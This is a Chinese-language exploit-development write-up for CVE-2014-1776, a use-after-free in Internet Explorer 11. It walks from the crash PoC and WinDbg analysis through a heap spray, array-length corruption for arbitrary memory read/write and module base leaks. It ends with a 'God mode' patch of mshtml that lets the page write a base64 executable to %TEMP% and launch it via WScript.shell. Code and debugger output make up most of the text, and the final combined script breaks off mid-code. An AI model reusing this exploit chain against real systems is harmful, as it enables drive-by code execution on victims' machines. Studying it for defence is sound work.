# CVE-2014-1776 

## 环境

系统: `Win8.1`  
浏览器: `IE11`

## poc

这个漏洞的`poc`如下:

```
<html xmlns:v="urn:schemas-microsoft-com:vml"> 
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
v\:*{Behavior: url(#default#VML)}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /> <script>
window.onload = function (){
	var head = document.getElementById("haed")
	tmp = document.createElement("CVE-2014-1776") 
	document.getElementById("vml").childNodes[0].appendChild(tmp) 
	tmp.appendChild(head)
	tmp = head.offsetParent
	tmp.onpropertychange = function(){
		this["removeNode"](true)	
		document.createElement("CVE-2014-1776").title = "" 
	}
	head.firstChild.nextSibling.disabled = head
}
</script>
</head>
<body><v:group id="vml" style="width:500pt;"><div></div></group></body> 
</html>
```

## 调试分析

首先打开`IE`的`hpa`和`ust`，然后打开浏览器，附加到`windbg`，运行页面后崩溃点如下:

```
0:005> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=0af74bd8 edx=043ab5a4 esi=0af74bd8 edi=00000000
eip=6161e75a esp=043ab5d4 ebp=043ab624 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSHTML!CMarkup::IsConnectedToPrimaryMarkup+0x6:
6161e75a 8b86a4000000    mov     eax,dword ptr [esi+0A4h] ds:0023:0af74c7c=????????
0:005> !heap -p -a esi
    address 0af74bd8 found in
    _DPH_HEAP_ROOT @ 931000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    af31514:          af74000             2000
    6f2f8fc2 verifier!AVrfDebugPageHeapFree+0x000000c2
    77a01d62 ntdll!RtlDebugFreeHeap+0x0000003c
    779c04c9 ntdll!RtlpFreeHeap+0x00066c59
    779594a8 ntdll!RtlFreeHeap+0x00000478
    ...
0:005> k
ChildEBP RetAddr  
0467b128 616c5366 MSHTML!CMarkup::IsConnectedToPrimaryMarkup+0x6
0467b16c 616c7dc6 MSHTML!CMarkup::OnCssChange+0x7e
0467b174 61c38fed MSHTML!CElement::OnCssChange+0x28
0467b18c 617088c3 MSHTML!CStyleElement::OnPropertyChange+0x4f5ea2
0467b200 6170891c MSHTML!SetNumberPropertyHelper<long,CSetIntegerPropertyHelper>+0x1e9
0467b220 61760472 MSHTML!NUMPROPPARAMS::SetNumberProperty+0x20
0467b248 61a0366a MSHTML!CBase::put_BoolHelper+0x2a
0467b260 61a030d8 MSHTML!CBase::put_Bool+0x24
0467b288 615db87a MSHTML!GS_VARIANTBOOL+0xaa
```

可以看到是一个典型的`uaf`漏洞，可以看到`ecx`和`esi`指向了对象，我们知道，开启堆页后，每个堆的分配都在页的底部，每个页的大小是`0x1000 bytes`，所以可以通过计算得到对象的大小:

```
0:005> ? 1000- (ecx & fff)
Evaluate expression: 1064 = 00000428
```

这个造成`uaf`的对象大小是`0x428`，接下来我们尝试一下占位，修改`poc`为:

```
<html xmlns:v="urn:schemas-microsoft-com:vml"> 
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
v\:*{Behavior: url(#default#VML)}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /> <script>
window.onload = function (){
	var head = document.getElementById("haed")
	tmp = document.createElement("CVE-2014-1776") 
	document.getElementById("vml").childNodes[0].appendChild(tmp) 
	tmp.appendChild(head)
	tmp = head.offsetParent
	tmp.onpropertychange = function(){
		this["removeNode"](true)	
		document.createElement("CVE-2014-1776").title = "" 

		var ele = document.createElement("div")
		ele.className = new Array(0x428/2).join("a")
	}
	head.firstChild.nextSibling.disabled = head
}
</script>
</head>
<body><v:group id="vml" style="width:500pt;"><div></div></group></body> 
</html>
```

关闭`hpa`和`ust`，在`MSHTML!CMarkup::IsConnectedToPrimaryMarkup+0x6`下断点，重新运行`IE`，断点可能断下多次，最终到发生`uaf`的地方，发现`esi`指向的内存被成功占位:

```
0:005> g
Breakpoint 1 hit
eax=00000000 ebx=00000000 ecx=010ef6f8 edx=02abb294 esi=010ef6f8 edi=00000000
eip=6161e75a esp=02abb2c4 ebp=02abb314 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
MSHTML!CMarkup::IsConnectedToPrimaryMarkup+0x6:
6161e75a 8b86a4000000    mov     eax,dword ptr [esi+0A4h] ds:0023:010ef79c=00610061
0:005> dd esi
010ef6f8  00610061 00610061 00610061 00610061
010ef708  00610061 00610061 00610061 00610061
010ef718  00610061 00610061 00610061 00610061
010ef728  00610061 00610061 00610061 00610061
010ef738  00610061 00610061 00610061 00610061
010ef748  00610061 00610061 00610061 00610061
010ef758  00610061 00610061 00610061 00610061
0:005> du esi
010ef6f8  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
010ef738  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
010ef778  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
010ef7b8  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
010ef7f8  "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
```

## IE11 Array对象分析

`IE11`中`Array`对象的分配与`IE10`有所不同，需要在`jscript9!Js::JavascriptNativeIntArray::NewInstance+0x81
`下断点，`eax`里的值就是`Array`结构体对象的地址，用`Array`对象实现一个堆喷:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array(0x1000);
	for (var i = 0; i < 0x1000; ++i) {
		a[i] = new Array(array_len);
		a[i][0] = 0x123; 
		a[i][1] = 0x123;
		a[i][2] = 0x123;
	}
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

得到的对象:

```
02ed7f60 658e37c4 03ddb740 00000000 00000005 00001000 14474010
02ed7f78 14474010 00000000 00000000 00000000 00000000 00000000
0:003> ln 658e37c4
(658e37c4)   jscript9!Js::JavascriptArray::`vftable'   |  (658e3974)   jscript9!Projection::ArrayObjectInstance::`vftable'
Exact matches:

```

偏移`0x10`处就是长度`0x1000`，`0x14`和`0x18`是缓冲区的地址，在全部堆喷完成后查看这块缓冲区:

```
14474010 00000000 00001000 00001000 00000000 02ed7f30 02ed7f00
14474028 02ed7ed0 02ed7ea0 02ed7e70 02ed7e40 02ed7e10 02ed7de0
14474040 02ed7db0 02ed7d80 02ed7d50 02ed7d20 02ed7cf0 02ed7cc0
14474058 02ed7c90 02ed7c60 02ed7c30 02ed7c00 02ed7bd0 02ed7ba0
14474070 02ed7b70 02ed7b40 02ed7b10 02ed7ab0 02ed7a80 02ed7a50
14474088 02ed7a20 02ed79f0 02ed79c0 02ed7990 02ed7960 02ed7930
```

保存的就是我们`Array`对象的地址，每个对象大小`0x30`:

```
02ed7f00 658e2f54 03ddb700 00000000 00000005 00003ff8 123b0010
02ed7f18 123b0010 00000000 00000001 02e68fd0 00000000 00000000
02ed7f30 658e2f54 03ddb700 00000000 00000005 00003ff8 14234010
02ed7f48 14234010 00000000 00000001 02e68fd0 00000000 00000000
```

数组缓冲区:

```
123b0010 00000000 00000005 00003ff8 00000000 00000123 00000123
123b0028 00000123 00000123 00000123 80000002 80000002 80000002
123b0040 80000002 80000002 80000002 80000002 80000002 80000002
123b0058 80000002 80000002 80000002 80000002 80000002 80000002
```

`IE11`中的`Array`的长度存储方式与`IE10`不同，总结如下:

```
Array对象:
+0x10: 缓冲区大小，当添加新元素时会变化
+0x14: 缓冲区地址，如果一开始不指定数组大小，缓冲区地址会根据添加元素动态变化

Array缓冲区:
+0x4: 实际大小，包含元素个数
+0x8: 这块缓冲区的大小
```

当喷射完后，查看预测地址的内容:

```
0c000000 00000000 0000fff0 00000000 00000000 00000000 00000005
0c000018 00003ff8 00000000 00000123 00000123 00000123 00000123
0c000030 00000123 80000002 80000002 80000002 80000002 80000002
0c000048 80000002 80000002 80000002 80000002 80000002 80000002
```

可以看到是一个`Array`对象的缓冲区。

那么`Array`结构体对象偏移`0x18`的地址是什么呢，一般来说和偏移`0x14`处的地址是一样的，如果在`Array`长度之外的索引添加元素呢，比如:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array(0x1000);
	for (var i = 0; i < 0x1000; ++i) {
		a[i] = new Array(array_len);
		a[i][0] = 0x123; 
		a[i][1] = 0x123;
		a[i][2] = 0x123;
		a[i][3] = 0x123;
		a[i][4] = 0x123;
	}
	alert("Modify array length");
	a[0][array_len+0x100]=1;
	a[0][array_len+0x90]=1;
	a[0][array_len+0x80]=1;
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

那么这时结构体是这样的:

```
02ed7f90 658e2f54 123c9b40 00000000 00000005 000040f9 048c4010
02ed7fa8 14433f00 00000000 00000001 02e68ff0 00000000 00000000
```

看到偏移`+0x10`的缓冲区大小增加了`0x100`，这次`+0x14`和`+0x18`处的地址不一样了，`+0x14`处依旧是原来缓冲区的地址:

```
048c4010 00000000 00000005 00003ff8 14433f00 00000123 00000123
048c4028 00000123 00000123 00000123 80000002 80000002 8000000
```

那我们添加的3个元素去哪了呢，看`+0x18`指向的缓冲区:

```
14433f00 00004078 00000001 00000010 14433f50  <= a[0][array_len+0x80]
14433f10 00000001 80000002 80000002 80000002
14433f20 80000002 80000002 80000002 80000002
14433f30 80000002 80000002 80000002 80000002
14433f40 80000002 80000002 80000002 80000002
14433f50 00004088 00000001 00000010 14433fa0  <= a[0][array_len+0x90]
14433f60 00000001 80000002 80000002 80000002
14433f70 80000002 80000002 80000002 80000002
14433f80 80000002 80000002 80000002 80000002
14433f90 80000002 80000002 80000002 80000002
14433fa0 000040f8 00000001 00000010 00000000  <= a[0][array_len+0x100]
```

看到这里其实是一个链表的形式，`+0x0`是当前数组大小，`+0x4`是元素本身，`+0xc`是链表下一个成员的地址。而如果要实现越界读写，就要改写`Array`数组的大小，那么有三个长度，我们应该修改的是`Array`缓冲区偏移`+0x8`的缓冲区大小，让程序误认为这块缓冲区很大，而不分配新的缓冲区，实现数组的越界读写。

## 任意地址读写

注意这里的`poc`中使用了`IE=EmulateIE9`，也就是模拟`IE9`，在`IE9`中是没有`Int32Array`这个对象的，`IE11`中的`Array`存储的值是有符号的

假设我们能够通过这个`uaf`漏洞实现修改指定地址的一个字节，那么就可以修改`0c000000`这个预测地址处`Array`缓冲区的`+0x8`处缓冲区大小的值，脚本如下:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array(0x1000);
	for (var i = 0; i < 0x1000; ++i) {
		a[i] = new Array(array_len);
		a[i][0] = 0x123; 
		a[i][1] = 0x123;
		a[i][2] = 0x123;
		a[i][3] = 0x123;
		a[i][4] = 0x123;
	}
	alert("Modify array length");
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0] == 1) {
			idx = i;
			break; 
		}
	}
	if (idx == -1) {
		alert("Can't find the modified Array"); 
		return;
	}
	alert("Found");
	a[idx][array_len + 0x14/4] = 0x3fffffff;
	a[idx][array_len + 0x18/4] = 0x3fffffff;
	a[idx+1].length = 0x3fffffff;
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

修改完后如果能够成功改写下一个`Array`的第一个元素为1则说明修改成功，然后把下一个`Array`的三个长度值全部修改为`0x3fffffff`，就可以读写`[array_addr, 0xffffffff]`的地址范围。

长度`0x1000`的`Array`对象:

```
02ed7f90 658e37c4 02edeb60 00000000 00000005 00001000 14390010
02ed7fa8 14390010 00000000 00000000 00000000 00000000 00000000
```

长度`0x3ff8`的`Array`对象:

```
0bc80a50 658e2f54 02edeb20 00000000 00000005 00003ff8 0c000010
0bc80a68 0c000010 00000000 00000001 02e68ff0 00000000 00000000
```

缓冲区:

```
0c000000 00000000 0000fff0 00000000 00000000 00000000 00000005
0c000018 00003ff8 00000000 00000123 00000123 00000123 00000123
0c000030 00000123 80000002 80000002 80000002 80000002 80000002
0c000048 80000002 80000002 80000002 80000002 80000002 80000002
```

先手动修改`0c000018`的值为`20003ff8`，全部完成后缓冲区:

```
0c000000 00000000 0000fff0 00000000 00000000 00000000 00004001
0c000018 20003ff8 00000000 00000123 00000123 00000123 00000123
0c000030 00000123 80000002 80000002 80000002 80000002 80000002
```

`Array`对象:

```
0bc80a50 658e2f54 02edeb20 00000000 00000001 00004001 0c000010 <= 修改的
0bc80a68 0c000010 00000000 00000001 02e68ff0 00000000 00000000
0bc80a80 658e2f54 02edeb20 00000000 00000005 3fffffff 0c010010 <= 下一个Array
0bc80a98 0c010010 00000000 00000001 02e68ff0 00000000 00000000
```

下一个`Array`的缓冲区，看到长度被成功修改:

```
0c010010 00000000 3fffffff 3fffffff 00000000 00000001 00000123
0c010028 00000123 00000123 00000123 80000002 80000002 80000002
0c010040 80000002 80000002 80000002 80000002 80000002 80000002
```

然后读写空间就是`[0c010010, 0xffffffff]`。为了读写`0x0c010010`的内存，比如想要读写`0x400000`的内存，使用数组索引的方法计算如下:

```
0xc010000 + index*4 = 0x400000 (mod 2^32)index = (0x400000 - 0xc010000)/4 (mod 2^32)index = (0x400000 + 0 - 0xc010000)/4 (mod 2^32) 
index = (0x400000 + 2^32 - 0xc010000)/4 (mod 2^32) 
index = 0x3d0fc000 (mod 2^32)
```

所以可以用整数溢出的方式读写内存，因为在`32`位下，0与`2^32`是一样的，`0-x`就相当于`2^32-x`，实现如下:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array(0x1000);
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0] = 0;
	}
	var magic_addr = 0xc000000;
	alert("Modify array length");
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0]==1) {
			idx = i;
			break; 
		}
	}
	if (idx==-1) {
		alert("Can't find the modified Array"); 
		return;
	}
	alert("Found");
	a[idx][array_len+0x14/4] = 0x3fffffff;
	a[idx][array_len+0x18/4] = 0x3fffffff;
	a[idx+1].length=0x3fffffff;
	alert("First Done");
	var base_addr = magic_addr+0x10000+header_size;

	function int2uint(x) {
		return (x<0)?0x100000000+x:x;
	}

	function uint2int(x) {
		return (x>=0x80000000)?x-0x100000000:x;
	}
	function read(addr) {
		var delta=addr-base_addr;
		var res;
		if (delta>=0)
			res=a[idx+1][delta/4];
		else
			res=a[idx+1][(0x100000000+delta)/4];
		return int2uint(res);
	}
	function write(addr,val) {
		val=uint2int(val);
		var delta=addr-base_addr;
		if (delta>=0)
			a[idx+1][delta/4]=val;
		else
			a[idx+1][(0x100000000+delta)/4]=val;
	}
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

## 获取模块基地址

还是使用读取虚表地址计算模块基地址:

```
0:014> ? mshtml
Evaluate expression: 1641086976 = 61d10000
0:014> ? jscript9
Evaluate expression: 1633615872 = 615f0000
0:014> ? poi(158b3a80)-jscript9
Evaluate expression: 14708 = 00003974
0:014> ? poi(poi(158b3a80+0x18))-mshtml
Evaluate expression: 2003120 = 001e90b0
```

现在的脚本:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array();
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0] = 0;
	}
	var magic_addr = 0xc000000;
	alert("Modify array length");
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0]==1) {
			idx = i;
			break; 
		}
	}
	if (idx==-1) {
		alert("Can't find the modified Array"); 
		return;
	}
	alert("Found");
	a[idx][array_len+0x14/4] = 0x3fffffff;
	a[idx][array_len+0x18/4] = 0x3fffffff;
	a[idx+1].length=0x3fffffff;
	alert("First Done");
	var base_addr = magic_addr+0x10000+header_size;

	function int2uint(x) {
		return (x<0)?0x100000000+x:x;
	}

	function uint2int(x) {
		return (x>=0x80000000)?x-0x100000000:x;
	}
	function read(addr) {
		var delta=addr-base_addr;
		var res;
		if (delta>=0)
			res=a[idx+1][delta/4];
		else
			res=a[idx+1][(0x100000000+delta)/4];
		return int2uint(res);
	}
	function write(addr,val) {
		val=uint2int(val);
		var delta=addr-base_addr;
		if (delta>=0)
			a[idx+1][delta/4]=val;
		else
			a[idx+1][(0x100000000+delta)/4]=val;
	}
	function get_addr(obj) {
		a[idx+2][0]=obj;
		return read(base_addr+0x10000);
	}

	var addr=get_addr(document.createElement("div"));
	var jscript9=read(addr)-0x3974;
	var mshtml=read(read(addr+0x18))-0x1e90b0;
	document.write("mshtml at: "+mshtml.toString(16));
	document.write("jscript9 at: "+jscript9.toString(16));
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

## 开启上帝模式执行任意代码

使用`WScript.shell`和`ADODB.Stream`把`base64`编码后的`PE`文件写到临时目录下然后运行:

```
<html>
<head>
<script language="javascript">
(function(){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array();
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0] = 0;
	}
	var magic_addr = 0xc000000;
	alert("Modify array length");
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0]==1) {
			idx = i;
			break; 
		}
	}
	if (idx==-1) {
		alert("Can't find the modified Array"); 
		return;
	}
	alert("Found");
	a[idx][array_len+0x14/4] = 0x3fffffff;
	a[idx][array_len+0x18/4] = 0x3fffffff;
	a[idx+1].length=0x3fffffff;
	alert("First Done");
	var base_addr = magic_addr+0x10000+header_size;

	function int2uint(x) {
		return (x<0)?0x100000000+x:x;
	}

	function uint2int(x) {
		return (x>=0x80000000)?x-0x100000000:x;
	}
	function read(addr) {
		var delta=addr-base_addr;
		var res;
		if (delta>=0)
			res=a[idx+1][delta/4];
		else
			res=a[idx+1][(0x100000000+delta)/4];
		return int2uint(res);
	}
	function write(addr,val) {
		val=uint2int(val);
		var delta=addr-base_addr;
		if (delta>=0)
			a[idx+1][delta/4]=val;
		else
			a[idx+1][(0x100000000+delta)/4]=val;
	}
	function get_addr(obj) {
		a[idx+2][0]=obj;
		return read(base_addr+0x10000);
	}

	var addr=get_addr(document.createElement("div"));
	var jscript9=read(addr)-0x3974;
	var mshtml=read(read(addr+0x18))-0x1e90b0;
	document.write("mshtml at: "+mshtml.toString(16));
	document.write("jscript9 at: "+jscript9.toString(16));
	alert("Second done");
	var old=read(mshtml+0xef56a0+0x14);
	var old1=read(mshtml+0xef56a0+0x10);

	function GodOn() {
		write(mshtml+0xef56a0+0x14,jscript9+0xcc05f);  // mov esp,ebp pop ebp ret
		write(mshtml+0xef56a0+0x10,jscript9+0xcc295);  // mov esp,ebp pop ebp ret
	}
	function GodOff() {
		write(mshtml+0xef56a0+0x14,old);
		write(mshtml+0xef56a0+0x10,old1);
	}
	// 运行calc.exe的PE文件的base64编码
	runcalc="TVqQAAMAAA...AAAAAA=";
	GodOn();
	var shell = new ActiveXObject("WScript.shell");
	var tStream = new ActiveXObject("ADODB.Stream"); 
	var bStream = new ActiveXObject("ADODB.Stream");
	GodOff();
	function createExe(fname, data) {
		tStream.Type = 2; // text 
		bStream.Type = 1; // binary 
		tStream.Open(); 
		bStream.Open();
		tStream.WriteText(data);
		tStream.Position = 2;
		tStream.CopyTo(bStream);
		var bStream_addr = get_addr(bStream);
		alert("bStream at: "+bStream_addr.toString(16));
		write(read(read(bStream_addr+0x50)+0x44), 0x003a0043);  // C:
		write(read(read(bStream_addr+0x50)+0x44)+0x4, 0x0000005c);  // \
		bStream.SaveToFile(fname, 2);
		tStream.Close();
		bStream.Close();
	}
	function decode(b64Data) {
		var data = window.atob(b64Data);
		var arr = new Array();
		for (var i = 0; i < data.length / 2; ++i) {
			var low = data.charCodeAt(i*2);
			var high = data.charCodeAt(i*2 + 1); 
			arr.push(String.fromCharCode(low + high * 0x100));
		}
		return arr.join(''); 
	}

	alert("shell done");
	fname=shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe"); 
	createExe(fname, decode(runcalc));
	shell.Exec(fname);
	alert("Done");
})();
</script> 
</head> 
<body> 
</body> 
</html>
```

## 利用占位修改一字节

接下来结合`uaf`漏洞修改一字节的数组长度:

```
<html xmlns:v="urn:schemas-microsoft-com:vml"> 
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
v\:*{Behavior: url(#default#VML)}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /> <script>

function dword2str(dword) {
	var low=dword%0x10000;
	var high=Math.floor(dword/0x10000);
	if (low==0||high==0) {
		alert("Null not allow");
	}
	return String.fromCharCode(low,high);
}

function getPattern(offset_values, tot_bytes) {
	if (tot_bytes%4!= 0)
		alert("getPattern(): tot_bytes is not a multiple of 4");
	var pieces = new Array();
	var pos=0;
	for (i = 0; i < offset_values.length/2; ++i) {
		var offset = offset_values[i*2];
		var value = offset_values[i*2 + 1];
		var padding = new Array((offset - pos)/2 + 1).join("a"); 
		pieces.push(padding + dword2str(value));
		pos = offset + 4; 
	}
	var padding = new Array((tot_bytes - 2 - pos)/2 + 1).join("a"); 
	pieces.push(padding);
	return pieces.join("");
}

window.onload = function (){
	var f=0x0c00001b-0x248;
	var z=0x0c00001b-0x248-0x638;
	var c=0x0c000020+0x24;
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array();
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0]=0x0c000020-0x1c+0x4;
		a[i][1]=0x0c000020;
		a[i][2]=0x20000;
		a[i][0xc/4]=z;
		a[i][0x24/4]=0x0;
		a[i][0x18/4]=0x0c000044;
		a[i][0x44/4]=0x80;
		a[i][0x5c/4]=0x0c000020+0x100*4;
		a[i][0x1b4/4]=0x1;
		a[i][0x130/4]=0x2;
		a[i][0x134/4]=0x100;
		a[i][0xf988/4]=0x0;
		a[i][0xf98c/4]=0x0;
		a[i][0x7e8/4]=0x0;
		a[i][0x7e4/4]=0x0;
	}
	alert("Done");
	var magic_addr = 0xc000000;
	var head = document.getElementById("haed");
	tmp = document.createElement("CVE-2014-1776"); 
	document.getElementById("vml").childNodes[0].appendChild(tmp);
	tmp.appendChild(head);
	tmp = head.offsetParent;
	tmp.onpropertychange = function(){
		this["removeNode"](true)	
		document.createElement("CVE-2014-1776").title = "";

		var ele = document.createElement("div");
		// ele.className = new Array(0x428/2).join("a")
		ele.className=getPattern([
			0xa4,magic_addr+0x20,0x118,magic_addr+0x44,
			0x198,-1],0x428);
	}
	head.firstChild.nextSibling.disabled = head;
	//alert("Done");
}
</script>
</head>
<body><v:group id="vml" style="width:500pt;"><div></div></group></body> 
</html>
```

似乎加上了一些头部后原先的脚本不管用了，报错:

```
SCRIPT438: 对象不支持“atob”属性或方法
```

`IE9`中没有`atob`方法，需要用自己实现的`atob`方法

```
<html xmlns:v="urn:schemas-microsoft-com:vml"> 
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
v\:*{Behavior: url(#default#VML)}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /> 
<script>
window.onload = function (){
	CollectGarbage();
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array();
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0] = 0;
	}
	var magic_addr = 0xc000000;
	alert("Modify array length");
	var idx = -1;
	for (var i = 0; i < 0x1000 - 1; ++i) {
		a[i][array_len + header_size/4] = 1;
		if (a[i+1][0]==1) {
			idx = i;
			break; 
		}
	}
	if (idx==-1) {
		alert("Can't find the modified Array"); 
		window.location.reload();
		return;
	}
	alert("Found");
	a[idx][array_len+0x14/4] = 0x3fffffff;
	a[idx][array_len+0x18/4] = 0x3fffffff;
	a[idx+1].length=0x3fffffff;
	alert("First Done");
	var base_addr = magic_addr+0x10000+header_size;

	function int2uint(x) {
		return (x<0)?0x100000000+x:x;
	}

	function uint2int(x) {
		return (x>=0x80000000)?x-0x100000000:x;
	}
	function read(addr) {
		var delta=addr-base_addr;
		var res;
		if (delta>=0)
			res=a[idx+1][delta/4];
		else
			res=a[idx+1][(0x100000000+delta)/4];
		return int2uint(res);
	}
	function write(addr,val) {
		val=uint2int(val);
		var delta=addr-base_addr;
		if (delta>=0)
			a[idx+1][delta/4]=val;
		else
			a[idx+1][(0x100000000+delta)/4]=val;
	}
	function get_addr(obj) {
		a[idx+2][0]=obj;
		return read(base_addr+0x10000);
	}

	function atob(input) {
		var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; 
		var str = String(input).replace(/=+$/, '');
		if (str.length % 4 == 1) {
			throw new InvalidCharacterError("'atob' failed: The string to be decoded is not correctly encoded."); 
		}
		for (
			var bc = 0, bs, buffer, idx = 0, output = '';
			buffer = str.charAt(idx++);
			~buffer && (bs = bc % 4 ? bs * 64 + buffer : buffer,
			bc++ % 4) ? output += String.fromCharCode(255 & bs >> (-2 * bc & 6)) : 0 
		){
			buffer = chars.indexOf(buffer); 
		}
		return output; 
	}

	var addr=get_addr(document.createElement("div"));
	alert(addr.toString(16));
	var jscript9=read(addr)-0x6da0;
	document.write("jscript9 at: "+jscript9.toString(16));
	var mshtml=read(read(read(read(addr+0xc)+8)+0x10))-0x1e90b0;
	document.write("mshtml at: "+mshtml.toString(16));
	alert("Second done");
	var old=read(mshtml+0xef56a0+0x14);
	var old1=read(mshtml+0xef56a0+0x10);

	function GodOn() {
		write(mshtml+0xef56a0+0x14,jscript9+0xcc05f);  // mov esp,ebp pop ebp ret
		write(mshtml+0xef56a0+0x10,jscript9+0xcc295);  // mov esp,ebp pop ebp ret
	}
	function GodOff() {
		write(mshtml+0xef56a0+0x14,old);
		write(mshtml+0xef56a0+0x10,old1);
	}
	runcalc="TVqQAAMAAA...AAAAAA=";
	GodOn();
	var shell = new ActiveXObject("WScript.shell");
	var tStream = new ActiveXObject("ADODB.Stream"); 
	var bStream = new ActiveXObject("ADODB.Stream");
	GodOff();
	function createExe(fname, data) {
		tStream.Type = 2; // text 
		bStream.Type = 1; // binary 
		tStream.Open(); 
		bStream.Open();
		tStream.WriteText(data);
		tStream.Position = 2;
		tStream.CopyTo(bStream);
		var bStream_addr = get_addr(bStream);
		alert("bStream at: "+bStream_addr.toString(16));
		write(read(read(bStream_addr+0x50)+0x44), 0x003a0043);  // C:
		write(read(read(bStream_addr+0x50)+0x44)+0x4, 0x0000005c);  // \
		bStream.SaveToFile(fname, 2);
		tStream.Close();
		bStream.Close();
	}
	function decode(b64Data) {
		var data = atob(b64Data);
		var arr = new Array();
		for (var i = 0; i < data.length / 2; ++i) {
			var low = data.charCodeAt(i*2);
			var high = data.charCodeAt(i*2 + 1); 
			arr.push(String.fromCharCode(low + high * 0x100));
		}
		return arr.join(''); 
	}

	alert("shell done");
	fname=shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe"); 
	createExe(fname, decode(runcalc));
	shell.Exec(fname);
	alert("Done");
}
</script> 
</head> 
<body><v:group id="vml" style="width:500pt;"><div></div></group></body> 
</html>
```

## 本地完整的脚本

```
<html xmlns:v="urn:schemas-microsoft-com:vml"> 
<head id="haed">
<title>IE Case Study - STEP1</title>
<style>
v\:*{Behavior: url(#default#VML)}
</style>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9" /> 
<script>
var magic_addr = 0xc000000;
function dword2str(dword) {
	var low=dword%0x10000;
	var high=Math.floor(dword/0x10000);
	if (low==0||high==0) {
		alert("Null not allow");
	}
	return String.fromCharCode(low,high);
}

function getPattern(offset_values, tot_bytes) {
	if (tot_bytes%4!= 0)
		alert("getPattern(): tot_bytes is not a multiple of 4");
	var pieces = new Array();
	var pos=0;
	for (i = 0; i < offset_values.length/2; ++i) {
		var offset = offset_values[i*2];
		var value = offset_values[i*2 + 1];
		var padding = new Array((offset - pos)/2 + 1).join("a"); 
		pieces.push(padding + dword2str(value));
		pos = offset + 4; 
	}
	var padding = new Array((tot_bytes - 2 - pos)/2 + 1).join("a"); 
	pieces.push(padding);
	return pieces.join("");
}

function trigger() {
	
	var head = document.getElementById("haed");
	tmp = document.createElement("CVE-2014-1776"); 
	document.getElementById("vml").childNodes[0].appendChild(tmp);
	tmp.appendChild(head);
	tmp = head.offsetParent;
	tmp.onpropertychange = function(){
		this["removeNode"](true)	
		document.createElement("CVE-2014-1776").title = "";

		var ele = document.createElement("div");
		// ele.className = new Array(0x428/2).join("a")
		ele.className=getPattern([
			0xa4,magic_addr+0x20,0x118,magic_addr+0x44,
			0x198,-1],0x428);
	}
	head.firstChild.nextSibling.disabled = head;
}

window.onload = function (){
	CollectGarbage();
	var f=0x0c00001b-0x248;
	var z=0x0c00001b-0x248-0x638;
	var c=0x0c000020+0x24;
	var header_size = 0x20;
	var array_len = (0x10000 - header_size)/4; 
	var a = new Array();
	for (var i = 0; i < 0x1000; ++i) {
		a[i]=new Array(array_len);
		a[i][0]=0x0c000020-0x1c+0x4;
		a[i][1]=0x0c000020;
		a[i][2]=0x20000;
		a[i][0xc/4]=z;
		a[i][0x24/4]=0x0;
		a[i][0x18/4]=0x0c000044;
		a[i][0x44/4]=0x80;
		a[i][0x5c/4]=0x0c000020+0x100*4;
		a[i][0x1b4/4]=0x1;
		a[i][0x130/4]=0x2;
